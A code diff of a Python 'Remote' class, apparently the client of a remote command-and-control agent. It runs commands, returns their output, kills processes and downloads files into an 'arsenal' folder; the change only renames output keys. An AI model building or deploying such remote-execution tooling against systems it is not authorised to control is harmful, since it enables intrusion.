@@ -37,7 +37,7 @@ class Remote:
             )
 
         if self.exec_process:
-            output = {'outcome': 'success', 'command': command, 'pid': self.exec_process.pid, 'forward_log': 'True'}
+            output = {'outcome': 'success', 'task_execute_command': {'command': command, 'pid': self.exec_process.pid}, 'forward_log': 'True'}
         else:
             output = {'outcome': 'failed', 'message': 'command execution failed', 'forward_log': 'True'}
         return output
@@ -47,7 +47,7 @@ class Remote:
             output = {'outcome': 'failed', 'message': 'no process is running', 'forward_log': 'False'}
             return output
         process_output = self.exec_process.stdout.read()
-        output = {'outcome': 'success', 'process_output': process_output, 'forward_log': 'True'}
+        output = {'outcome': 'success', 'task_get_command_output': process_output, 'forward_log': 'True'}
         return output
 
     def task_kill_command(self):
@@ -55,7 +55,7 @@ class Remote:
             output = {'outcome': 'failed', 'message': 'no command is running', 'forward_log': 'False'}
             return output
         self.exec_process.terminate()
-        output = {'outcome': 'success', 'message': 'command killed', 'forward_log': 'True'}
+        output = {'outcome': 'success', 'task_kill_command': 'command killed', 'forward_log': 'True'}
         return output
     
     def task_download_file(self):
@@ -91,7 +91,7 @@ class Remote:
             with open(f'arsenal\\{file_name}', 'wb+') as f:
                 for chunk in r.iter_content(chunk_size=8192): 
                     f.write(chunk)
-        output = {'outcome': 'success', 'file_path': 'arsenal', 'file_name': file_name, 'forward_log': 'True'}
+        output = {'outcome': 'success', 'task_download_file': {'file_path': 'arsenal', 'file_name': file_name}, 'forward_log': 'True'}
         return output
 
     def echo(self):
